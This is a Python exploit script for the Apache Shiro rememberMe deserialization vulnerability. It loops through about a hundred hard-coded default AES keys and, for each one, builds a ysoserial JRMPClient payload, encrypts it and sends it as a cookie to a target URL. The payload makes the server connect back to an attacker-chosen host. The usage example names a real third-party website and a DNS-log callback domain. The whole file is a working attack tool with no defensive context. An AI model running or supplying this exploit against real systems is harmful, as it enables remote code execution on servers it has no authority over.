# -*- coding: utf-8 -*-
import requests
import os
import sys
import uuid
import base64
import subprocess
import argparse
from Crypto.Cipher import AES
keys=['kPH+bIxk5D2deZiIxcaaaA==','4AvVhmFLUs0KTA3Kprsdag==','Z3VucwAAAAAAAAAAAAAAAA==','fCq+/xW488hMTCD+cmJ3aQ==','0AvVhmFLUs0KTA3Kprsdag==','1AvVhdsgUs0FSA3SDFAdag==','1QWLxg+NYmxraMoxAXu/Iw==','25BsmdYwjnfcWmnhAciDDg==','2AvVhdsgUs0FSA3SDFAdag==','3AvVhmFLUs0KTA3Kprsdag==','3JvYhmBLUs0ETA5Kprsdag==','r0e3c16IdVkouZgk1TKVMg==','5aaC5qKm5oqA5pyvAAAAAA==','5AvVhmFLUs0KTA3Kprsdag==','6AvVhmFLUs0KTA3Kprsdag==','6NfXkC7YVCV5DASIrEm1Rg==','6ZmI6I2j5Y+R5aSn5ZOlAA==','cmVtZW1iZXJNZQAAAAAAAA==','7AvVhmFLUs0KTA3Kprsdag==','8AvVhmFLUs0KTA3Kprsdag==','8BvVhmFLUs0KTA3Kprsdag==','9AvVhmFLUs0KTA3Kprsdag==','OUHYQzxQ/W9e/UjiAGu6rg==','a3dvbmcAAAAAAAAAAAAAAA==','aU1pcmFjbGVpTWlyYWNsZQ==','bWljcm9zAAAAAAAAAAAAAA==','bWluZS1hc3NldC1rZXk6QQ==','bXRvbnMAAAAAAAAAAAAAAA==','ZUdsaGJuSmxibVI2ZHc9PQ==','wGiHplamyXlVB11UXWol8g==','U3ByaW5nQmxhZGUAAAAAAA==','MTIzNDU2Nzg5MGFiY2RlZg==','L7RioUULEFhRyxM7a2R/Yg==','a2VlcE9uR29pbmdBbmRGaQ==','WcfHGU25gNnTxTlmJMeSpw==','OY//C4rhfwNxCQAQCrQQ1Q==','5J7bIJIV0LQSN3c9LPitBQ==','f/SY5TIve5WWzT4aQlABJA==','bya2HkYo57u6fWh5theAWw==','WuB+y2gcHRnY2Lg9+Aqmqg==','3qDVdLawoIr1xFd6ietnwg==','ZWvohmPdUsAWT3=KpPqda','6Zm+6I2j5Y+R5aS+5ZOlAA==','2A2V+RFLUs+eTA3Kpr+dag==','6ZmI6I2j3Y+R1aSn5BOlAA==','SkZpbmFsQmxhZGUAAAAAAA==','2cVtiE83c4lIrELJwKGJUw==','fsHspZw/92PrS3XrPW+vxw==','XTx6CKLo/SdSgub+OPHSrw==','sHdIjUN6tzhl8xZMG3ULCQ==','O4pdf+7e+mZe8NyxMTPJmQ==','HWrBltGvEZc14h9VpMvZWw==','rPNqM6uKFCyaL10AK51UkQ==','Y1JxNSPXVwMkyvES/kJGeQ==','lT2UvDUmQwewm6mMoiw4Ig==','MPdCMZ9urzEA50JDlDYYDg==','xVmmoltfpb8tTceuT5R7Bw==','c+3hFGPjbgzGdrC+MHgoRQ==','ClLk69oNcA3m+s0jIMIkpg==','Bf7MfkNR0axGGptozrebag==','1tC/xrDYs8ey+sa3emtiYw==','ZmFsYWRvLnh5ei5zaGlybw==','cGhyYWNrY3RmREUhfiMkZA==','IduElDUpDDXE677ZkhhKnQ==','yeAAo1E8BOeAYfBlm4NG9Q==','cGljYXMAAAAAAAAAAAAAAA==','2itfW92XazYRi5ltW0M2yA==','XgGkgqGqYrix9lI6vxcrRw==','ertVhmFLUs0KTA3Kprsdag==','5AvVhmFLUS0ATA4Kprsdag==','s0KTA3mFLUprK4AvVhsdag==','hBlzKg78ajaZuTE0VLzDDg==','9FvVhtFLUs0KnA3Kprsdyg==','d2ViUmVtZW1iZXJNZUtleQ==','yNeUgSzL/CfiWw1GALg6Ag==','NGk/3cQ6F5/UNPRh8LpMIg==','4BvVhmFLUs0KTA3Kprsdag==','MzVeSkYyWTI2OFVLZjRzZg==','CrownKey==a12d/dakdad','empodDEyMwAAAAAAAAAAAA==','A7UzJgh1+EWj5oBFi+mSgw==','YTM0NZomIzI2OTsmIzM0NTueYQ==','c2hpcm9fYmF0aXMzMgAAAA==','i45FVt72K2kLgvFrJtoZRw==','U3BAbW5nQmxhZGUAAAAAAA==','ZnJlc2h6Y24xMjM0NTY3OA==','Jt3C93kMR9D5e8QzwfsiMw==','MTIzNDU2NzgxMjM0NTY3OA==','vXP33AonIp9bFwGl7aT7rA==','V2hhdCBUaGUgSGVsbAAAAA==','Z3h6eWd4enklMjElMjElMjE=','Q01TX0JGTFlLRVlfMjAxOQ==','ZAvph3dsQs0FSL3SDFAdag==','Is9zJ3pzNh2cgTHB4ua3+Q==','NsZXjXVklWPZwOfkvk6kUA==','GAevYnznvgNCURavBhCr1w==','66v1O8keKNV3TTcGPK1wzg==','SDKOLKn2J1j/2BHjeZwAoQ==']
#get a rememberme payload
def encode_rememberme(key1,command):
    command=base64.b16encode(key1.encode()).decode()+'.'+command
    popen = subprocess.Popen(['java', '-jar', '../module/ysoserial.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode(key1)
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

def exp_shiro(url,cmd):
    for oneKey in keys:
        print(oneKey)
        payload = encode_rememberme(oneKey,cmd)
        headers={
            #"Host": "192.168.99.100:8081",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Cookie": "JSESSIONID=CF5804018B87760C96E8908FA1A56149;rememberMe={0}".format(payload.decode()),
            "Upgrade-Insecure-Requests": "1"
        }
        #print("JSESSIONID=CF5804018B87760C96E8908FA1A56149;rememberMe={0}".format(payload.decode()))
        requests.get(url,headers=headers)

if __name__=='__main__':
    if len(sys.argv)!=3:
        print("Usage:"+"python3 shiro.py  url  \"command\"")
        print("Example:"+"python3 shiro_jrmp.py http://www.baidu.com/login.do \"zzz1695jb.dnslog.cn\"")
    else:
        try:
            url = sys.argv[1]
            command = sys.argv[2]
            exp_shiro(url,command)
        except Exception as e:
            print(e)